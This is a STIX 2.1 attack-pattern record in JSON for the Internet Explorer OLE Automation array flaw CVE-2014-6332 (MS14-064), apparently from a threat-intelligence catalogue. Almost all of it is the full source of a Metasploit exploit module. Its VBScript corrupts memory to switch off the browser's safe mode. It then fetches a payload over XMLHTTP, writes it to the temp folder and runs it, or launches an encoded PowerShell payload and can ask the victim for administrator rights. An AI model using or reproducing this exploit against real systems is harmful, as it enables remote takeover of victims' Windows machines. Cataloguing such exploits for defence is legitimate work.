{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a7d4717b-4043-4e4c-a809-aec53fa63e7d",
    "created": "2024-08-14T16:44:45.961095Z",
    "modified": "2024-08-14T16:44:45.961099Z",
    "name": "\"MS14-064 Microsoft Internet Explorer Windows OLE Automation Array Remote Code Execution\"",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms14_064_ole_code_execution.rb",
            "external_id": "ms14_064_ole_code_execution.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6332"
        },
        {
            "source_name": "reference",
            "url": "http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows"
        },
        {
            "source_name": "reference",
            "url": "https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS14-064 Microsoft Internet Explorer Windows OLE Automation Array Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits the Windows OLE Automation array vulnerability, CVE-2014-6332.\n        The vulnerability is known to affect Internet Explorer 3.0 until version 11 within\n        Windows 95 up to Windows 10, and no patch for Windows XP. However, this exploit will\n        only target Windows XP and Windows 7 box due to the Powershell limitation.\n\n        Windows XP by defaults supports VBS, therefore it is used as the attack vector. On other\n        newer Windows systems, the exploit will try using Powershell instead.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Robert Freeman', # IBM X-Force\n          'yuange', # twitter.com/yuange75\n          'Rik van Duijn', # twitter.com/rikvduijn\n          'Wesley Neelen', # security[at]forsec.nl\n          'GradiusX <francescomifsud[at]gmail.com>',\n          'b33f', # @FuzzySec\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-6332' ],\n          [ 'MSB', 'MS14-064' ],\n          [ 'OSVDB', '114533' ],\n          [ 'EDB', '35229' ],\n          [ 'EDB', '35308' ],\n          [ 'URL', 'http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows' ],\n          [ 'URL', 'https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module' ]\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP',\n            {\n              'os_name' => OperatingSystems::Match::WINDOWS_XP\n            }\n          ],\n          [\n            'Windows 7',\n              {\n                'os_name' => OperatingSystems::Match::WINDOWS_7\n              }\n          ]\n        ],\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :ua_name => HttpClients::IE,\n          :arch    => ARCH_X86,\n          :ua_ver  => lambda { |ver| ver.to_i.between?(4, 10) }\n        },\n      'DefaultOptions' =>\n        {\n          'HTTP::compression' => 'gzip',\n          'Powershell::wrap_double_quotes' => false\n        },\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\"\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-11-13',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n           OptBool.new('TRYUAC', [true, 'Ask victim to start as Administrator', false]),\n           OptBool.new('AllowPowershellPrompt', [true, 'Allow exploit to try Powershell', false])\n        ])\n  end\n\n  def vbs_prepare()\n    code = %Q|\ndim   aa()\ndim   ab()\ndim   a0\ndim   a1\ndim   a2\ndim   a3\ndim   win9x\ndim   intVersion\ndim   rnda\ndim   funclass\ndim   myarray\n\nBegin()\n\nfunction Begin()\n  On Error Resume Next\n  info=Navigator.UserAgent\n\n  if(instr(info,\"Win64\")>0)   then\n     exit   function\n  end if\n\n  if (instr(info,\"MSIE\")>0)   then\n             intVersion = CInt(Mid(info, InStr(info, \"MSIE\") + 5, 2))\n  else\n     exit   function\n\n  end if\n\n  win9x=0\n\n  BeginInit()\n  If Create()=True Then\n     myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)\n     myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)\n\n     if(intVersion<4) then\n         document.write(\"<br> IE\")\n         document.write(intVersion)\n         runshellcode()\n     else\n          setnotsafemode()\n     end if\n  end if\nend function\n\nfunction BeginInit()\n   Randomize()\n   redim aa(5)\n   redim ab(5)\n   a0=13+17*rnd(6)\n   a3=7+3*rnd(5)\nend function\n\nfunction Create()\n  On Error Resume Next\n  dim i\n  Create=False\n  For i = 0 To 400\n    If Over()=True Then\n    '   document.write(i)\n       Create=True\n       Exit For\n    End If\n  Next\nend function\n\nsub testaa()\nend sub\n\nfunction mydata()\n    On Error Resume Next\n     i=testaa\n     i=null\n     redim  Preserve aa(a2)\n\n     ab(0)=0\n     aa(a1)=i\n     ab(0)=6.36598737437801E-314\n\n     aa(a1+2)=myarray\n     ab(2)=1.74088534731324E-310\n     mydata=aa(a1)\n     redim  Preserve aa(a0)\nend function\n\nfunction setnotsafemode()\n    On Error Resume Next\n    i=mydata()\n    i=readmemo(i+8)\n    i=readmemo(i+16)\n    j=readmemo(i+&h134)\n    for k=0 to &h60 step 4\n        j=readmemo(i+&h120+k)\n        if(j=14) then\n              j=0\n              redim  Preserve aa(a2)\n     aa(a1+2)(i+&h11c+k)=ab(4)\n              redim  Preserve aa(a0)\n\n     j=0\n              j=readmemo(i+&h120+k)\n\n               Exit for\n           end if\n\n    next\n    ab(2)=1.69759663316747E-313\n    runaaaa()\nend function\n\nfunction Over()\n    On Error Resume Next\n    dim type1,type2,type3\n    Over=False\n    a0=a0+a3\n    a1=a0+2\n    a2=a0+&h8000000\n\n    redim  Preserve aa(a0)\n    redim   ab(a0)\n\n    redim  Preserve aa(a2)\n\n    type1=1\n    ab(0)=1.123456789012345678901234567890\n    aa(a0)=10\n\n    If(IsObject(aa(a1-1)) = False) Then\n       if(intVersion<4) then\n           mem=cint(a0+1)*16\n           j=vartype(aa(a1-1))\n           if((j=mem+4) or (j*8=mem+8)) then\n              if(vartype(aa(a1-1))<>0)  Then\n                 If(IsObject(aa(a1)) = False ) Then\n                   type1=VarType(aa(a1))\n                 end if\n              end if\n           else\n             redim  Preserve aa(a0)\n             exit  function\n\n           end if\n        else\n           if(vartype(aa(a1-1))<>0)  Then\n              If(IsObject(aa(a1)) = False ) Then\n                  type1=VarType(aa(a1))\n              end if\n            end if\n        end if\n    end if\n\n\n    If(type1=&h2f66) Then\n          Over=True\n    End If\n    If(type1=&hB9AD) Then\n          Over=True\n          win9x=1\n    End If\n\n    redim  Preserve aa(a0)\n\nend function\n\nfunction ReadMemo(add)\n    On Error Resume Next\n    redim  Preserve aa(a2)\n\n    ab(0)=0\n    aa(a1)=add+4\n    ab(0)=1.69759663316747E-313\n    ReadMemo=lenb(aa(a1))\n\n    ab(0)=0\n\n    redim  Preserve aa(a0)\nend function\n\n    |\n\n  end\n\n  def vbs_vector(prep)\n    vbs_name = \"#{Rex::Text.rand_text_alpha(rand(16)+4)}.vbs\"\n    gif_name = \"#{Rex::Text.rand_text_alpha(rand(5)+3)}.gif\"\n\n    payload_src = \"#{gif_name}\"\n\n    # I tried to use ADODB.Stream to save my downloaded executable, but I was hitting an issue\n    # with it, so I ended up with Scripting.FileSystemObject. Not so bad I guess.\n    %Q|<!doctype html>\n<html>\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE8\" >\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n<body>\n<script language=\"VBScript\">\nfunction runaaaa()\nOn Error Resume Next\n\nset xmlhttp = CreateObject(\"Microsoft.XMLHTTP\")\nxmlhttp.open \"GET\", \"#{payload_src}\", False\nxmlhttp.send\n\nSet objFSO=CreateObject(\"Scripting.FileSystemObject\")\nfolder = objFSO.GetSpecialFolder(2)\nscriptName = folder + \"\\\\#{vbs_name}\"\nSet objFile = objFSO.CreateTextFile(scriptName,True)\nobjFile.Write xmlhttp.responseText\nobjFile.Close\n\nset shell=createobject(\"Shell.Application\")\nshell.ShellExecute \"wscript.exe\", scriptName, \"\", \"open\", 0\n\nend function\n</script>\n<script language=\"VBScript\">\n#{prep}\n</script>\n</body>\n</html>\n    |\n  end\n\n  def powershell_vector(prep)\n    if datastore['TRYUAC']\n      tryuac = 'runas'\n    else\n      tryuac = 'open'\n    end\n\n    # Powershell was the first technique demonstrated publicly.\n    # On some Windows setups such as Windows 7 without a service pack, this works quite well.\n    # But other Windows setups you will get a prompt.\n    payl = cmd_psh_payload(payload.encoded,\"x86\",{ :remove_comspec => true })\n    payl.slice! \"powershell.exe \"\n\n    %Q|<!doctype html>\n<html>\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE8\" >\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n<body>\n<script language=\"VBScript\">\nfunction runaaaa()\nOn Error Resume Next\nset shell=createobject(\"Shell.Application\")\nshell.ShellExecute \"powershell.exe\", \"#{payl}\", \"\", \"#{tryuac}\", 0\nend function\n</script>\n<script language=\"VBScript\">\n#{prep}\n</script>\n</body>\n</html>\n    |\n  end\n\n  def get_html\n    prep = vbs_prepare()\n    case get_target.name\n    when OperatingSystems::Match::WINDOWS_XP\n      return vbs_vector(prep)\n    else\n      return powershell_vector(prep)\n    end\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    if get_target.name.match(OperatingSystems::Match::WINDOWS_7) && !datastore['AllowPowershellPrompt']\n      send_not_found(cli)\n      return\n    end\n\n    case request.uri\n    when /\\.gif/\n      if get_target.name =~ OperatingSystems::Match::WINDOWS_XP\n        p = regenerate_payload(cli)\n        data = generate_payload_exe({:code => p.encoded})\n\n        # The default template uses \\n, and wscript.exe isn't very happy about that.\n        # It should be \\r\\n .\n        vbs = Msf::Util::EXE.to_exe_vbs(data).gsub(/\\x0a/, \"\\r\\n\")\n\n        print_status(\"Sending VBS stager\")\n        send_response(cli, vbs)\n      else\n        # The VBS technique is only for Windows XP. So if a non-XP system is requesting it,\n        # something is not right.\n        send_not_found(cli)\n      end\n    else\n      print_status(\"Sending exploit...\")\n      send_exploit_html(cli, get_html)\n    end\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-11-13",
    "x_mitre_platforms": [
        "win'"
    ]
}